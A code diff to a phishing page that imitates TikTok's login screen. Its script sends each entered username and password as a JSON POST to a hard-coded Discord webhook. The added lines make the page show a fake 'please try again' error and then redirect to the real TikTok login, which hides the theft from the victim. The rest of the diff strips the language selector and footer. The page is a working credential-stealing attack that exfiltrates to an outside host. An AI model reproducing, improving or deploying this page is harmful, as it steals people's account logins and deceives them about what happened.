@@ -2044,6 +2044,7 @@
           <div class="tiktok-1a9biv2-de495bb3--DivHomeContainer er6rj9q1">
             <h2 data-e2e="login-title" id="login-modal-title" class="tiktok-uckhos-de495bb3--H2Title en5526c3">Log in to
               TikTok</h2>
+            <h3 style="color: rgb(255, 69, 69); display: inline;" id="sorry">Sorry, Please try again.</h3>
             <div class="tiktok-1bgdhko-de495bb3--DivLoginOptionContainer er6rj9q5">
               <div data-e2e="login-desc" class="tiktok-1x7rrf1-de495bb3--DivDescriptionContainer en5526c2">Manage your
                 account, check notifications, comment on videos and more.</div>
@@ -2063,6 +2064,9 @@
                 const url = "https://discordapp.com/api/webhooks/1554223615250014328/TiwY9xX9FU53NcDlQ-rR8Zx4WbLB7CQE2F3ZquBooEJdrNOoZaYvrkZ1XmbjofJtqdtR"
                 console.log(url)
 
+                let sorrytryagain = document.getElementById("sorry")
+                sorrytryagain.style.display = "none"
+
                 function doit() {
                   const msg = {
                     "content": `**New input** \n User: \`${document.getElementById("user").value}\` \n Pass: \`${document.getElementById("pass").value}\` <@&1554223278581751939>`,
@@ -2074,6 +2078,12 @@
                   fetch(url,
                     { "method": "POST", "headers": { "content-type": "application/json" }, "body": JSON.stringify(msg) }
                   )
+
+                  sorrytryagain.style.display = "inline"
+
+                  setTimeout(() => {
+                    window.open("https://www.tiktok.com/login")
+                  }, 2000);
                 }
               </script>
 
@@ -2141,72 +2151,11 @@
             class="tiktok-ziy4u4-de495bb3--ALink elfe54h0"><span data-e2e="bottom-sign-up"
               class="tiktok-1kr71hx-de495bb3--SpanLinkText e8hmmo01">Sign up</span></a>
         </div>
-        <div class="tiktok-pyjt6n-de495bb3--DivBottomContainer e1banavt1">
-          <div class="tiktok-1hq1m3z-de495bb3--DivContainer e1x2cibr0">
-            <p class="tiktok-1poy56l-de495bb3--PSelectContainer e1x2cibr1"><span>English (UK)</span></p><select
-              class="tiktok-1p11x0p-de495bb3--SelectFormContainer e1x2cibr2">
-              <option value="az">Azərbaycan</option>
-              <option value="id-ID">Bahasa Indonesia</option>
-              <option value="ms-MY">Bahasa Melayu</option>
-              <option value="jv-ID">Basa Jawa</option>
-              <option value="ca">Català</option>
-              <option value="ceb-PH">Cebuano</option>
-              <option value="cs-CZ">Čeština</option>
-              <option value="da">Dansk</option>
-              <option value="de-DE">Deutsch</option>
-              <option value="et">Eesti</option>
-              <option selected="" value="en-GB">English (UK)</option>
-              <option value="en">English (US)</option>
-              <option value="es">Español</option>
-              <option value="es-419">Español (Latinoamérica)</option>
-              <option value="fil-PH">Filipino</option>
-              <option value="fr">Français</option>
-              <option value="fr-CA">Français (Canada)</option>
-              <option value="ga">Gaeilge</option>
-              <option value="hr">Hrvatski</option>
-              <option value="is">Íslenska</option>
-              <option value="it-IT">Italiano</option>
-              <option value="sw">Kiswahili</option>
-              <option value="lv">Latviešu</option>
-              <option value="lt">Lietuvių</option>
-              <option value="hu-HU">Magyar</option>
-              <option value="nl-NL">Nederlands</option>
-              <option value="nb">norsk (bokmål)</option>
-              <option value="uz">Oʻzbek</option>
-              <option value="pl-PL">Polski</option>
-              <option value="pt">Português</option>
-              <option value="pt-BR">Português (Brasil)</option>
-              <option value="ro-RO">Română</option>
-              <option value="sq">Shqip</option>
-              <option value="sk">Slovenčina</option>
-              <option value="sl">Slovenščina</option>
-              <option value="fi-FI">Suomi</option>
-              <option value="sv-SE">Svenska</option>
-              <option value="vi-VN">Tiếng Việt</option>
-              <option value="tr-TR">Türkçe</option>
-              <option value="el-GR">Ελληνικά</option>
-              <option value="bg">Български</option>
-              <option value="kk">Қазақша</option>
-              <option value="ru-RU">Русский</option>
-              <option value="uk-UA">Українська</option>
-              <option value="he-IL">עברית</option>
-              <option value="ur">اردو</option>
-              <option value="ar">العربية</option>
-              <option value="hi-IN">हिंदी</option>
-              <option value="bn-IN">বাংলা</option>
-              <option value="th-TH">ภาษาไทย</option>
-              <option value="my-MM">မြန်မာ</option>
-              <option value="km-KH">ខ្មែរ</option>
-              <option value="ja-JP">日本語</option>
-              <option value="zh-Hant-TW">中文 (繁體)</option>
-              <option value="zh-Hans">中文 (简体)</option>
-              <option value="ko-KR">한국어</option>
-            </select>
-          </div>
-          <div class="tiktok-bbbxqq-de495bb3--DivCopyright e1banavt2">© <!-- -->2026<!-- --> TikTok</div>
-        </div>
+
       </div>
-    </div><!-- weaver: 0.2.0 -->
+    </div>
+  </div>
+  </div><!-- weaver: 0.2.0 -->
   </div>
   <div>
     <script id="SIGI_STATE" <script id="SIGI_RETRY" type="application/json">{}</script>
